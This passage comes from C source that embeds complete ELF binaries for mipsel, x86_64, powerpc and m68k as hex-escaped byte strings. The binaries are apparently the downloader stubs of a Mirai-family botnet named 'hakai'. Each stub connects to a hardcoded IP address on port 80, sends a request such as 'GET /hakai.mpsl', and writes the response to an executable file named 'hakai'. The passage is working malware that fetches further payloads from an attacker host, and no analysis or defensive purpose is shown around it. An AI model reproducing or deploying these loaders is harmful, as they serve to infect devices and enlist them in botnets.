x00\x00\x00\x00\x00\x00\x00\x00\x05\x08\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1620,
    // mipsel
    BIT_32, ENDIAN_LITTLE, EM_MIPS, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x01\x00\x00\x00\xe8\x01\x40\x00\x34\x00\x00\x00\x3c\x05\x00\x00\x07\x10\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\xb8\x04\x00\x00\xb8\x04\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\xc0\x04\x00\x00\xc0\x04\x44\x00\xc0\x04\x44\x00\x48\x00\x00\x00\x60\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x10\x84\x9c\x27\x21\xe0\x99\x03\x50\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa1\x0f\x04\x24\x05\x00\x1c\x3c\xf4\x83\x9c\x27\x21\xe0\x99\x03\x50\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa6\x0f\x04\x24\x05\x00\x1c\x3c\xd8\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa5\x0f\x04\x24\x05\x00\x1c\x3c\xb0\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x50\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x03\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\x64\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa4\x0f\x04\x24\x05\x00\x1c\x3c\x3c\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x50\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa3\x0f\x04\x24\x05\x00\x1c\x3c\x14\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x50\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x01\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\xc8\x82\x9c\x27\x21\xe0\x99\x03\x40\xff\xbd\x27\xbc\x00\xbf\xaf\xb8\x00\xb2\xaf\xb4\x00\xb1\xaf\xb0\x00\xb0\xaf\x10\x00\xbc\xaf\x02\x00\x02\x24\x1c\x00\xa2\xa7\x00\x50\x02\x24\x18\x80\x84\x8f\x1e\x00\xa2\xa7\xb9\xfa\x02\x3c\x54\x80\x99\x8f\xb2\x80\x42\x34\x90\x04\x84\x24\x01\x03\x05\x24\xff\x01\x06\x24\x09\xf8\x20\x03\x20\x00\xa2\xaf\x10\x00\xbc\x8f\x02\x00\x05\x24\x44\x80\x99\x8f\x21\x30\x00\x00\x02\x00\x04\x24\x09\xf8\x20\x03\x21\x90\x40\x00\x10\x00\xbc\x8f\x21\x20\x40\x00\x3c\x80\x99\x8f\x1c\x00\xa5\x27\x10\x00\x06\x24\x09\xf8\x20\x03\x21\x88\x40\x00\x10\x00\xbc\x8f\x21\x20\x20\x02\x18\x80\x85\x8f\x40\x80\x99\x8f\x98\x04\xa5\x24\x09\xf8\x20\x03\x1c\x00\x06\x24\x1c\x00\x03\x24\x10\x00\xbc\x8f\x07\x00\x43\x10\x21\x80\x00\x00\x48\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\x21\x80\x00\x00\x34\x80\x99\x8f\x21\x20\x20\x02\x18\x00\xa5\x27\x09\xf8\x20\x03\x01\x00\x06\x24\x10\x00\xbc\x8f\x01\x00\x03\x24\x48\x80\x99\x8f\x04\x00\x43\x10\x04\x00\x04\x24\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\x18\x00\xa3\x83\x00\x12\x10\x00\x25\x80\x43\x00\x0a\x0d\x02\x3c\x0a\x0d\x42\x34\xed\xff\x02\x16\x00\x00\x00\x00\x34\x80\x99\x8f\x2c\x00\xb0\x27\x21\x20\x20\x02\x21\x28\x00\x02\x09\xf8\x20\x03\x80\x00\x06\x24\x10\x00\xbc\x8f\x21\x28\x00\x02\x40\x80\x99\x8f\x21\x30\x40\x00\x06\x00\x40\x18\x21\x20\x40\x02\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\xf0\xff\x00\x10\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x20\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x40\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x48\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\xbc\x00\xbf\x8f\xb8\x00\xb2\x8f\xb4\x00\xb1\x8f\xb0\x00\xb0\x8f\x08\x00\xe0\x03\xc0\x00\xbd\x27\x00\x00\x00\x00\x05\x00\x1c\x3c\x00\x81\x9c\x27\x21\xe0\x99\x03\x21\x10\x80\x00\x21\x20\xa0\x00\x21\x28\xc0\x00\x21\x30\xe0\x00\x10\x00\xa7\x8f\x14\x00\xa8\x8f\x18\x00\xa9\x8f\x1c\x00\xaa\x8f\xe0\xff\xbd\x27\x10\x00\xa8\xaf\x14\x00\xa9\xaf\x18\x00\xaa\xaf\x1c\x00\xa2\xaf\x1c\x00\xa2\x8f\x0c\x00\x00\x00\x03\x00\xe0\x14\x20\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00\x21\x20\x40\x00\x38\x80\x99\x8f\x00\x00\x00\x00\x08\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x90\x80\x9c\x27\x21\xe0\x99\x03\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xb0\xaf\x10\x00\xbc\xaf\x30\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x80\x80\x00\x10\x00\xbc\x8f\x00\x00\x50\xac\x1c\x00\xbf\x8f\x18\x00\xb0\x8f\xff\xff\x02\x24\x08\x00\xe0\x03\x20\x00\xbd\x27\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x40\x80\x9c\x27\x21\xe0\x99\x03\x2c\x80\x82\x8f\x08\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x70\x73\x6c\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x05\x44\x00\x70\x04\x40\x00\x74\x01\x40\x00\x20\x04\x40\x00\x00\x01\x40\x00\x4c\x01\x40\x00\x9c\x01\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x00\xb0\x03\x40\x00\xd8\x00\x40\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xa0\x00\x40\x00\xa0\x00\x00\x00\xf0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x90\x04\x40\x00\x90\x04\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x10\xc0\x04\x44\x00\xc0\x04\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x10\x05\x44\x00\x08\x05\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x08\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x05\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1620,
    // x86_64
    BIT_64, ENDIAN_LITTLE, EM_X86_64, "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x3a\x01\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x88\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x03\x00\x40\x00\x05\x00\x04\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x63\x02\x00\x00\x00\x00\x00\x00\x63\x02\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x51\xe5\x74\x64\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x89\xfe\x31\xc0\xbf\x3c\x00\x00\x00\xe9\x02\x01\x00\x00\x89\xfe\x31\xc0\xbf\x03\x00\x00\x00\xe9\xf4\x00\x00\x00\x89\xd1\x31\xc0\x89\xf2\x48\x89\xfe\xbf\x02\x00\x00\x00\xe9\xe1\x00\x00\x00\x89\xd1\x31\xc0\x48\x89\xf2\x89\xfe\xbf\x01\x00\x00\x00\xe9\xce\x00\x00\x00\x89\xd1\x31\xc0\x48\x89\xf2\x89\xfe\x31\xff\xe9\xbe\x00\x00\x00\x55\xba\xff\x01\x00\x00\xbe\x41\x02\x00\x00\xbf\x3e\x02\x40\x00\x53\x48\x81\xec\x98\x00\x00\x00\xe8\xad\xff\xff\xff\xba\x1e\x00\x00\x00\xbe\x44\x02\x40\x00\x89\xdf\x89\xc5\xe8\xad\xff\xff\xff\x83\xf8\x1e\x74\x0a\xbf\x03\x00\x00\x00\xe8\x6f\xff\xff\xff\x31\xdb\x48\x8d\xb4\x24\x8f\x00\x00\x00\xba\x01\x00\x00\x00\x89\xdf\xe8\x9b\xff\xff\xff\xff\xc8\x74\x0a\xbf\x04\x00\x00\x00\xe8\x4b\xff\xff\xff\x0f\xbe\x84\x24\x8f\x00\x00\x00\xc1\xe3\x08\x09\xc3\x81\xfb\x0a\x0d\x0a\x0d\x75\xc9\xba\x80\x00\x00\x00\x48\x89\xe6\x89\xe7\xe8\x69\xff\xff\xff\x85\xc0\x7e\x0e\x89\xc2\x48\x89\xe6\x89\xef\xe8\x46\xff\xff\xff\xeb\xdf\x89\xe7\xe8\x1c\xff\xff\xff\x89\xef\xe8\x15\xff\xff\xff\xbf\x03\x00\x00\x00\xe8\xfd\xfe\xff\xff\x48\x81\xc4\x98\x00\x00\x00\x5b\x5d\xc3\x90\x90\x90\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\x48\x3d\x01\xf0\xff\xff\x0f\x83\x03\x00\x00\x00\xc3\x90\x90\x48\x83\xec\x08\x48\x89\xc1\x48\xf7\xd9\xe8\x09\x00\x00\x00\x89\x08\x83\xc8\xff\x5a\xc3\x90\x90\xb8\x64\x02\x50\x00\xc3\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x78\x38\x36\x5f\x36\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\xe8\x00\x40\x00\x00\x00\x00\x00\xe8\x00\x00\x00\x00\x00\x00\x00\x56\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x00\x00\x00\x00\x3e\x02\x40\x00\x00\x00\x00\x00\x3e\x02\x00\x00\x00\x00\x00\x00\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x64\x02\x50\x00\x00\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x64\x02\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 968,
    // powerpc
    BIT_32, ENDIAN_BIG, EM_PPC, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x14\x00\x00\x00\x01\x10\x00\x02\x0c\x00\x00\x00\x34\x00\x00\x03\xd4\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x03\xb4\x00\x00\x03\xb4\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x03\xb4\x10\x01\x03\xb4\x10\x01\x03\xb4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x01\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\x81\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x06\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\x55\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x05\x4c\xc6\x31\x82\x48\x00\x02\x1d\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x03\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x01\xe1\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x04\x4c\xc6\x31\x82\x48\x00\x01\xa9\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x03\x4c\xc6\x31\x82\x48\x00\x01\x71\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x01\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x01\x35\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\x40\x3d\x20\xb2\x80\x3c\x60\x10\x00\x61\x29\xb9\xfa\x38\x80\x02\x41\x90\x01\x00\xc4\x38\x00\x00\x02\x38\xa0\x01\xff\xb0\x01\x00\x0c\x38\x63\x03\x90\x38\x00\x00\x50\xb0\x01\x00\x0e\x91\x21\x00\x10\xbf\xa1\x00\xb4\x4b\xff\xfe\xa5\x7c\x7e\x1b\x78\x38\x80\x00\x01\x38\xa0\x00\x00\x38\x60\x00\x02\x4b\xff\xff\x75\x38\x81\x00\x0c\x38\xa0\x00\x10\x7c\x7f\x1b\x78\x4b\xff\xfe\xb9\x3c\x80\x10\x00\x38\x84\x03\x98\x7f\xe3\xfb\x78\x38\xa0\x00\x1b\x4b\xff\xfe\xe1\x2f\x83\x00\x1b\x41\x9e\x00\x0c\x38\x60\x00\x03\x4b\xff\xfe\x05\x3b\xa0\x00\x00\x38\x81\x00\x08\x38\xa0\x00\x01\x7f\xe3\xfb\x78\x4b\xff\xfe\xf5\x2f\x83\x00\x01\x38\x60\x00\x04\x41\x9e\x00\x08\x4b\xff\xfd\xe1\x89\x61\x00\x08\x57\xa9\x40\x2e\x3c\x00\x0d\x0a\x7d\x3d\x5b\x78\x60\x00\x0d\x0a\x7f\x9d\x00\x00\x40\x9e\xff\xc8\x3b\xa1\x00\x1c\x38\xa0\x00\x80\x7f\xa4\xeb\x78\x7f\xe3\xfb\x78\x4b\xff\xfe\xb5\x7f\xa4\xeb\x78\x7c\x65\x1b\x79\x7f\xc3\xf3\x78\x40\x81\x00\x0c\x4b\xff\xfe\x69\x4b\xff\xff\xd8\x7f\xe3\xfb\x78\x4b\xff\xfd\xbd\x7f\xc3\xf3\x78\x4b\xff\xfd\xb5\x38\x60\x00\x03\x4b\xff\xfd\x81\x80\x01\x00\xc4\xbb\xa1\x00\xb4\x38\x21\x00\xc0\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x60\x1b\x78\x7c\x83\x23\x78\x7c\xa4\x2b\x78\x7c\xc5\x33\x78\x7c\xe6\x3b\x78\x7d\x07\x43\x78\x44\x00\x00\x02\x4c\x83\x00\x20\x48\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xe0\xbf\xa1\x00\x14\x7c\x7d\x1b\x78\x90\x01\x00\x24\x48\x00\x00\x21\x93\xa3\x00\x00\x38\x60\xff\xff\x80\x01\x00\x24\xbb\xa1\x00\x14\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x3c\x60\x10\x01\x38\x63\x03\xb4\x4e\x80\x00\x20\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x70\x70\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x73\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x10\x00\x00\x94\x00\x00\x00\x94\x00\x00\x02\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x10\x00\x03\x90\x00\x00\x03\x90\x00\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x10\x01\x03\xb4\x00\x00\x03\xb4\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xb4\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1180,
    // m68k
    BIT_32, ENDIAN_BIG, EM_68K, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x04\x00\x00\x00\x01\x80\x00\x01\x74\x00\x00\x00\x34\x00\x00\x03\x38\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x00\x00\x00\x03\x17\x00\x00\x03\x17\x00\x00\x00\x05\x00\x00\x20\x00\x00\x00\x00\x01\x00\x00\x03\x18\x80\x00\x23\x18\x80\x00\x23\x18\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x20\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x01\x61\xff\x00\x00\x01\xe6\x50\x8f\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x06\x61\xff\x00\x00\x01\xce\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x05\x61\xff\x00\x00\x01\xb0\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x03\x48\x78\x00\x66\x61\xff\x00\x00\x01\x84\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x04\x61\xff\x00\x00\x01\x66\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x03\x61\xff\x00\x00\x01\x48\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x01\x48\x78\x00\x66\x61\xff\x00\x00\x01\x1c\x4e\x5e\x4e\x75\x4e\x56\xff\x6c\x48\xe7\x30\x20\x3d\x7c\x00\x02\xff\xee\x3d\x7c\x00\x50\xff\xf0\x2d\x7c\xb2\x80\xb9\xfa\xff\xf2\x48\x78\x01\xff\x48\x78\x02\x41\x48\x79\x80\x00\x02\xf4\x61\xff\xff\xff\xff\x22\x26\x00\x42\xa7\x48\x78\x00\x01\x48\x78\x00\x02\x61\xff\xff\xff\xff\x96\x24\x40\x48\x78\x00\x10\x48\x6e\xff\xee\x2f\x00\x61\xff\xff\xff\xff\x1c\x4f\xef\x00\x20\x2e\xbc\x00\x00\x00\x1c\x48\x79\x80\x00\x02\xfa\x2f\x0a\x61\xff\xff\xff\xff\x30\x4f\xef\x00\x0c\x72\x1c\xb2\x80\x67\x0c\x48\x78\x00\x03\x61\xff\xff\xff\xfe\xa4\x58\x8f\x42\x82\x48\x78\x00\x01\x48\x6e\xff\xff\x2f\x0a\x61\xff\xff\xff\xff\x26\x4f\xef\x00\x0c\x72\x01\xb2\x80\x67\x0c\x48\x78\x00\x04\x61\xff\xff\xff\xfe\x7c\x58\x8f\xe1\x8a\x10\x2e\xff\xff\x49\xc0\x84\x80\x0c\x82\x0d\x0a\x0d\x0a\x66\xc8\x48\x78\x00\x80\x24\x0e\x06\x82\xff\xff\xff\x6e\x2f\x02\x2f\x0a\x61\xff\xff\xff\xfe\xe8\x4f\xef\x00\x0c\x4a\x80\x6f\x12\x2f\x00\x2f\x02\x2f\x03\x61\xff\xff\xff\xfe\xb6\x4f\xef\x00\x0c\x60\xd0\x2f\x0a\x45\xf9\x80\x00\x00\xac\x4e\x92\x2f\x03\x4e\x92\x48\x78\x00\x03\x61\xff\xff\xff\xfe\x20\x4f\xef\x00\x0c\x4c\xee\x04\x0c\xff\x60\x4e\x5e\x4e\x75\x4e\x75\x4e\x56\xff\xf8\x48\xe7\x3c\x00\x20\x6e\x00\x20\x2a\x2e\x00\x1c\x28\x2e\x00\x18\x26\x2e\x00\x14\x24\x2e\x00\x10\x22\x2e\x00\x0c\x20\x2e\x00\x08\x4e\x40\x2d\x40\xff\xf8\x20\x2e\xff\xf8\x72\x82\xb2\x80\x64\x1a\x20\x2e\xff\xf8\x44\x80\x2d\x40\xff\xfc\x61\xff\x00\x00\x00\x1c\x20\xae\xff\xfc\x72\xff\x2d\x41\xff\xf8\x20\x2e\xff\xf8\x4c\xee\x00\x3c\xff\xe8\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x20\x3c\x80\x00\x23\x18\x20\x40\x4e\x5e\x4e\x75\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x36\x38\x6b\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x